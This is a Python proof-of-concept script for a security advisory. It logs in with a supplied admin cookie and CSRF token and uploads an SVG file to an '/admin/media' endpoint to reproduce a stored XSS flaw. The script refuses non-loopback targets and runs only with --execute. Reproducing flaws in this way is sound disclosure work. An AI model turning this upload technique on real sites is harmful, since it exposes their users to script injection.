#!/usr/bin/env python3
"""Loopback-only harmless SVG upload helper for GHSA-9gxw-qpx8-x9c7."""

import argparse
import http.client
import ipaddress
from pathlib import Path
import secrets
import urllib.parse


def loopback_only(url: str) -> urllib.parse.ParseResult:
    parsed = urllib.parse.urlparse(url)
    host = parsed.hostname
    if not host:
        raise SystemExit("Invalid --base-url")
    if host != "localhost":
        try:
            if not ipaddress.ip_address(host).is_loopback:
                raise SystemExit("Refusing non-loopback target; use an isolated local lab")
        except ValueError:
            raise SystemExit("Refusing non-loopback target; use an isolated local lab")
    return parsed


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--cookie", required=True, help="Cookie header value")
    parser.add_argument("--csrf", required=True)
    parser.add_argument("--execute", action="store_true")
    args = parser.parse_args()

    parsed = loopback_only(args.base_url)
    if not args.execute:
        raise SystemExit("Dry run only. Add --execute for a disposable loopback lab.")

    marker = Path(__file__).with_name("marker.svg").read_bytes()
    boundary = "----capivara-" + secrets.token_hex(12)
    chunks = [
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"_token\"\r\n\r\n{args.csrf}\r\n".encode(),
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"marker.svg\"\r\nContent-Type: image/svg+xml\r\n\r\n".encode(),
        marker,
        f"\r\n--{boundary}--\r\n".encode(),
    ]
    body = b"".join(chunks)
    connection_cls = http.client.HTTPSConnection if parsed.scheme == "https" else http.client.HTTPConnection
    conn = connection_cls(parsed.hostname, parsed.port, timeout=10)
    base_path = parsed.path
    endpoint = (base_path.rstrip("/") + "/admin/media") or "/admin/media"
    conn.request("POST", endpoint, body=body, headers={
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "Content-Length": str(len(body)),
        "Cookie": args.cookie,
        "Accept": "application/json",
    })
    response = conn.getresponse()
    response_body = response.read(4096).decode("utf-8", errors="replace")
    print(f"HTTP {response.status}")
    print(response_body)
    print("Open the returned media URL manually and look for the harmless XSS marker.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
